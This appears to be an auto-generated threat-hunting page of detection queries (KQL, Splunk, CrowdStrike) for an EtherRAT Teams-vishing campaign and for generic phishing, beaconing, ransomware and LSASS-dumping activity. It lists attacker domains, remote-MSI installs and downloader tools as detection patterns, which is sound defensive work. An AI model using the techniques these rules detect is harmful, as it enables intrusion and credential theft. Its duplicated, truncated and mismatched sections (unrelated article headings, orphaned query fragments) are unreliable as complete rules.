Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] External Microsoft Teams chat/call from unfamiliar tenant impersonating IT/helpdesk · Phishing-link click correlated to endpoint execution · Email attachment opened from external sender · Microsoft Teams external-tenant chat from unverified IT-helpdesk impersonator
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Office app spawning script/LOLBin child process · Fake CAPTCHA / clipboard-injected PowerShell (ClickFix / FakeCaptcha) · Article-specific behavioural hunt — Fake IT support calls on Microsoft Teams push EtherRAT malware
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] Msiexec installing remote EtherRAT loader MSI (v#.msi) from camorreado.click · RMM tool installed by non-IT user — remote-access utility for hands-on-keyboard
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] Dual remote-access tools (HopToDesk + AnyDesk) installed on same host within short window · [LLM] Endpoint DNS/network egress to EtherRAT delivery & C2 domain camorreado.click · Beaconing — periodic outbound to small set of destinations · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
External Microsoft Teams chat/call from unfamiliar tenant impersonating IT/helpdesk AIDelivery High
Hunts inbound Microsoft Teams external-access chat/message activity from a foreign M365 tenant whose account poses as IT support (e.g. helpdesk@Progressive936.onmicrosoft.com). This is the initial-access lure in the EtherRAT vishing campaign where the 'External unfamiliar' Teams contact precedes a remote-control request. Rationale: Anchors on the article's concrete external-tenant IOC (helpdesk@Progressive936.onmicrosoft.com) plus the 'External unfamiliar' impersonation pattern; ExternalAccess==true on Teams from an onmicrosoft.com sender posing as helpdesk is the campaign's exact entry signal. Datadog/Falcon left empty — Teams audit isn't in FDR or Datadog's listed Azure sources. Cross-checked against: • https://www.microsoft.com/en-us/security/blog/2026/04/18/crosstenant-helpdesk-impersonation-data-exfiltration-human-operated-intrusion-playbook/ • https://www.microsoft.com/en-us/security/blog/2025/10/07/disrupting-threats-targeting-microsoft-teams/
ATT&CKT1566.004 T1656
Data sources
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate managed-service-provider (MSP) helpdesk that operates from its own M365 tenant and contacts staff via external Teams
  • Partner/vendor IT collaborating cross-tenant during a genuine support case
  • Internal 'helpdesk' shared mailbox federated as a guest in a subsidiary tenant
  • Approved outsourced service-desk display names containing 'IT Support'
Suppression filter
| where UPN !has_any ("contoso-msp", "trusted-partner")  // append approved partner onmicrosoft tenants
Response runbook
Step 1 (triage): Confirm the sender tenant (onmicrosoft.com domain) is not an approved partner; check whether the recipient accepted a screen-share/remote-control request in the same Teams session and whether any download followed. Step 2 (contain): Block the external tenant/domain in Teams external-access policy, disable the impacted user's active sessions, and quarantine the endpoint if remote-control was granted. Step 3 (hunt): On the recipient's device pivot to RMM installs (hoptodesk.exe/anydesk.exe) and msiexec pulling from camorreado.click within the following hour.
CloudAppEvents
| where Timestamp > ago(30d)
| where Application =~ "Microsoft Teams"
| where ActionType in~ ("ChatCreated","MemberAdded","MessageSent","MessagesListed")
| extend UPN = tostring(RawEventData.UserId)
| where UPN has "onmicrosoft.com"
| where UPN has "Progressive936" or tolower(AccountDisplayName) has_any ("helpdesk","help desk","it support","system administrator") or tolower(UPN) has "helpdesk"
| project Timestamp, ActionType, AccountDisplayName, UPN, IPAddress, AccountType, ObjectName
| order by Timestamp desc
OfficeActivity
| where TimeGenerated > ago(30d)
| where OfficeWorkload =~ "MicrosoftTeams"
| where ExternalAccess == true
| where Operation in~ ("ChatCreated","MemberAdded","MessageSent","MessagesExported")
| where UserId has "onmicrosoft.com"
| where UserId has "Progressive936" or tolower(UserId) has "helpdesk" or tolower(UserId) has "it-support"
| project TimeGenerated, Operation, UserId, ClientIP, UserAgent, OfficeId
| order by TimeGenerated desc
CLOUD
`o365_management_activity` Workload=MicrosoftTeams Operation IN ("ChatCreated","MemberAdded","MessageSent") ExternalAccess=true
| search (UserId="*Progressive936*" OR UserId="*helpdesk*" OR UserId="*it-support*" OR UserId="*helpdesk@*.onmicrosoft.com")
| stats min(_time) as firstSeen, count, values(Operation) as operations, values(ClientIP) as srcIPs by UserId
| sort - firstSeen
Dual remote-access tools (HopToDesk + AnyDesk) installed on same host within short window AICommand & Control High
Hunts a host that executes BOTH HopToDesk and AnyDesk within a short window — the exact dual-RMM staging the attacker walks the victim through after the Teams remote-control grant. Two distinct remote-access tools appearing together on one endpoint is far higher fidelity than either tool alone. Rationale: Uses the two specific RMM binaries named in the article (HopToDesk, AnyDesk) and requires BOTH on the same host — the dcount>=2 requirement suppresses the common single-legit-AnyDesk noise while capturing the attacker's exact staging step. Datadog rule groups by host and thresholds distinctTools at rule level. Cross-checked against: • https://www.malwarebytes.com/blog/threat-intel/2026/06/inside-a-malicious-infrastructure-delivering-etherrat-phishing-pages-and-malicious-software
ATT&CKT1219
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • IT department evaluating/migrating between two RMM products on a test machine
  • Managed-service provider that legitimately deploys AnyDesk while a user separately installed HopToDesk for personal use
  • Sysadmin bench machine used to reproduce customer support scenarios with multiple remote tools
  • Security team detonating RMM samples in a sandboxed but Defender-onboarded host
Suppression filter
| where DeviceName !in~ ("it-bench01","soc-detonation01")  // exclude sanctioned RMM-eval hosts
Response runbook
Step 1 (triage): Confirm neither tool is on the org's approved RMM allowlist and check for a preceding external Teams contact (UC1) or msiexec pull from camorreado.click on the same host. Step 2 (contain): Kill hoptodesk.exe/anydesk.exe, terminate their unattended-access sessions, and isolate the endpoint from the network. Step 3 (hunt): Look for msiexec executing v#.msi from camorreado.click and node.exe beaconing that follows the RMM sessions.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where FileName in~ ("hoptodesk.exe","anydesk.exe")
| where AccountName !endswith "$"
| summarize DistinctTools = dcount(tolower(FileName)), Tools = make_set(FileName), FirstSeen = min(Timestamp), SampleCmd = any(ProcessCommandLine) by DeviceName, AccountName
| where DistinctTools >= 2   // HopToDesk + AnyDesk together on one host
| order by FirstSeen desc
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| extend Bin = tolower(tostring(split(NewProcessName,"\\")[-1]))
| where Bin in ("hoptodesk.exe","anydesk.exe")
| where SubjectUserName !endswith "$"
| summarize DistinctTools = dcount(Bin), Tools = make_set(Bin), FirstSeen = min(TimeGenerated), SampleCmd = any(CommandLine) by Computer, SubjectUserName
| where DistinctTools >= 2
| order by FirstSeen desc
source:windows.sysmon @EventID:1 @Image:(*\\hoptodesk.exe OR *\\HopToDesk.exe OR *\\anydesk.exe OR *\\AnyDesk.exe)
#event_simpleName=ProcessRollup2 ImageFileName=/(hoptodesk|anydesk)\.exe$/i
| RmmTool := if(ImageFileName=/hoptodesk\.exe$/i, then="hoptodesk", else="anydesk")
| groupBy([aid, ComputerName], function=[count(field=RmmTool, distinct=true, as=distinctTools), collect([RmmTool])])
| distinctTools>=2
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` min(_time) as firstSeen, values(Processes.process_name) as tools, dc(Processes.process_name) as toolTypes from datamodel=Endpoint.Processes where Processes.process_name IN ("hoptodesk.exe","anydesk.exe") by Processes.dest, Processes.user
| `drop_dm_object_name(Processes)`
| where toolTypes>=2   // both HopToDesk AND AnyDesk = campaign's dual-RMM lure
| sort - firstSeen
| tstats summariesonly=false min(_time) as firstSeen, values(Processes.process_name) as tools, dc(Processes.process_name) as toolTypes from datamodel=Endpoint.Processes where Processes.process_name IN ("hoptodesk.exe","anydesk.exe") by Processes.dest, Processes.user
| `drop_dm_object_name(Processes)`
| where toolTypes>=2   // both HopToDesk AND AnyDesk = campaign's dual-RMM lure
| sort - firstSeen
Msiexec installing remote EtherRAT loader MSI (v#.msi) from camorreado.click AIInstallation High
Hunts msiexec.exe invoked against a remote MSI hosted on camorreado[.]click (observed as v7.msi from an open directory of v1–v9 installers). This MSI is the EtherRAT loader that fetches a legit Node.js runtime and decrypts embedded payloads — a single-command, high-fidelity execution pivot. Rationale: Pins on the exact delivery domain camorreado[.]click and the v#.msi naming from the open-directory (v1-v9) — msiexec pulling a remote MSI from an attacker domain is inherently rare and the domain string makes FPs near-zero. Cross-checked against: • https://www.malwarebytes.com/blog/threat-intel/2026/06/inside-a-malicious-infrastructure-delivering-etherrat-phishing-pages-and-malicious-software • https://www.sysdig.com/blog/etherrat-dissected-how-a-react2shell-implant-delivers-5-payloads-through-blockchain-c2
ATT&CKT1218.007 T1105
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Internal software-distribution server that happens to name packages v7.msi (mitigated by the camorreado.click requirement, but the regex alone could match)
  • Developer testing a locally hosted MSI over http with a v#.msi filename
  • Legitimate vendor MSI download whose URL coincidentally contains a v-number pattern
  • Security researcher detonating the sample in an onboarded sandbox
Response runbook
Step 1 (triage): Pull the full msiexec command line and confirm the source URL is camorreado.click; check the parent process (was it a browser/RMM session started by the vishing lure?). Step 2 (contain): Isolate the host, block camorreado.click at proxy/DNS, and collect the dropped MSI plus any node.exe artifacts for analysis. Step 3 (hunt): Sweep the estate for other v1–v9 MSI names from camorreado.click and for node.exe spawned by msiexec beaconing to the same domain.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName =~ "msiexec.exe"
| where ProcessCommandLine has "camorreado.click" or ProcessCommandLine matches regex @"(?i)https?://\S*v[1-9]\.msi"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, SHA256
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4688
| where NewProcessName endswith "\\msiexec.exe"
| where CommandLine has "camorreado.click" or CommandLine matches regex @"(?i)https?://\S*v[1-9]\.msi"
| project TimeGenerated, Computer, SubjectUserName, CommandLine, ParentProcessName
| order by TimeGenerated desc

Endpoint DNS/network egress to EtherRAT delivery & C2 domain camorreado.click AICommand & Control High
Hunts any host resolving or connecting to camorreado[.]click — the EtherRAT loader-download and campaign C2 domain. Catches both the MSI/Node.js pull and subsequent beaconing regardless of which process (msiexec, node.exe, browser) drives the connection, complementing the msiexec process pivot. Rationale: camorreado[.]click is the article's single confirmed network IOC (corroborated by Malwarebytes' infrastructure write-up); a domain match is a clean pure-IOC detection and the Defender query surfaces the initiating process (expect msiexec.exe or node.exe) for immediate triage. Cross-checked against: • https://www.malwarebytes.com/blog/threat-intel/2026/06/inside-a-malicious-infrastructure-delivering-etherrat-phishing-pages-and-malicious-software
ATT&CKT1071.001 T1105
Data sourcesNetwork_Resolution.DNS
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Threat-intel/URL-detonation appliance or analyst sandbox resolving the IOC on purpose
  • Web proxy or DNS-security product pre-resolving flagged domains for categorization
  • Newly-registered lookalike domain reused for benign parking after takedown
  • SOC tooling that pings known-bad domains for availability monitoring
Suppression filter
| where ClientIP !in ("10.10.20.5")  // exclude the URL-detonation sandbox resolver
Response runbook
Step 1 (triage): Identify the initiating process (node.exe from a temp path or msiexec = high concern) and the requesting host/user. Step 2 (contain): Sinkhole/block camorreado.click at DNS and proxy, isolate any host with a successful connection, and preserve node.exe + dropped payloads. Step 3 (hunt): Look for the follow-on EtherRAT behaviour — node.exe polling public Ethereum RPC endpoints for its C2 URL — and correlate back to the originating Teams vishing session and RMM installs.
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteUrl has "camorreado.click"
| project Timestamp, DeviceName, RemoteUrl, RemoteIP, RemotePort, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine
| order by Timestamp desc
DnsEvents
| where TimeGenerated > ago(30d)
| where Name =~ "camorreado.click" or Name endswith ".camorreado.click"
| project TimeGenerated, Computer, ClientIP, Name, QueryType, Result
| order by TimeGenerated desc

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

    [| tstats summariesonly=false earliest(_time) AS exec_time

                                                   "outlook.exe","brave.exe","arc.exe")

         by Processes.dest, Processes.user

Email attachment opened from external sender Delivery High
Attachment delivery + execution by recipient — most common malware initial access.
ATT&CKT1566.001 T1204.002
Data sourcesEmail.All_Email Endpoint.Processes EmailAttachmentInfo DeviceProcessEvents
let LookbackDays = 7d;
let MalAttachments = EmailAttachmentInfo
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | project NetworkMessageId, RecipientEmailAddress,
              AttachmentFileName = FileName, AttachmentSHA256 = SHA256;
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
| where FileName in~ ("cmd.exe","powershell.exe","wscript.exe","cscript.exe",
                      "mshta.exe","rundll32.exe","regsvr32.exe")
| join kind=inner MalAttachments on $left.AccountUpn == $right.RecipientEmailAddress
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, AttachmentFileName, AttachmentSHA256
// Sentinel doesn't have an attachment-hash table. Best approximation:
// OfficeActivity Send/Receive activity + correlate to host process spawn.
let LookbackDays = 7d;
let MailWithAttach = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation in~ ("Send","Receive")
    | where isnotempty(MessageId)
    | project EmailTime = TimeGenerated, MailboxOwnerUPN, Sender,
              Recipients, Subject, MessageId;
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName endswith "OUTLOOK.EXE"
| where NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\mshta.exe"
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc

OfficeActivity

Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → Phishing-link click correlated to endpoint execution
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Fake CAPTCHA / clipboard-injected PowerShell (ClickFix / FakeCaptcha) · Trusted vendor binary / installer launching unusual children · Article-specific behavioural hunt — Iran-Linked Hackers Use New Cavern C2 Framework to Target Israeli Organizations
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → Suspicious browser extension installation · RMM tool installed by non-IT user — remote-access utility for hands-on-keyboard
Command & Control. Beacon to attacker infrastructure for control and tasking. → Beaconing — periodic outbound to small set of destinations · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → Infostealer — non-browser process accessing browser cookie/login DBs · Remote service execution — PsExec / SMB lateral movement · Ransomware-style mass file rename / extension change · LSASS process access / dump (credential theft)
Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
| tstats summariesonly=false count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

Ransomware-style mass file rename / extension change Actions on Objectives Medium
Threshold detection: many files renamed in short window, often with new extension.
ATT&CKT1486
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(1d)
| where InitiatingProcessAccountName !endswith "$"
| where ActionType in ("FileRenamed","FileModified")
| summarize files = dcount(FileName) by DeviceName, InitiatingProcessAccountName, bin(Timestamp, 1m)
| where files > 200    // empirical: > 200 unique-file renames in 1m by one account on one host

| order by files desc

| where TimeGenerated > ago(1d)
| where ActorUsername !endswith "$"
| where EventType in ("FileRenamed","FileModified")
| summarize files = dcount(TargetFileName)
            by DvcHostname, ActorUsername, ActingProcessName, bin(TimeGenerated, 1m)
| where files > 200    // P99 of legit bulk-tooling per-minute rename volume
| order by files desc

LSASS process access / dump (credential theft) Actions on Objectives High
Mimikatz, comsvcs.dll MiniDump, or any non-Windows process opening LSASS.
ATT&CKT1003.001 T1003
Data sourcesEndpoint.Processes DeviceEvents
DeviceEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where ActionType == "OpenProcessApiCall"
| where FileName =~ "lsass.exe"
| where InitiatingProcessFileName !in~ ("MsSense.exe","MsMpEng.exe","csrss.exe",
                                          "svchost.exe","wininit.exe","services.exe",
                                          "lsm.exe","SearchProtocolHost.exe")
| project Timestamp, DeviceName, ActionType, FileName,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessFolderPath, AccountName
| order by Timestamp desc
// SecurityEvent EventID 4663 = object access. AccessMask 0x10 / 0x40 / 0x1010
// indicate read access to lsass.exe — credential-dump signature. Audit
// Object Access > Audit File System policy required.
SecurityEvent

16-Year-Old Linux KVM Flaw Lets Guest VMs Escape to Host on Intel and AMD x86 Systems

The Hacker News
2026-07-06 10 use cases 3 techniques 6 kill-chain phases detected

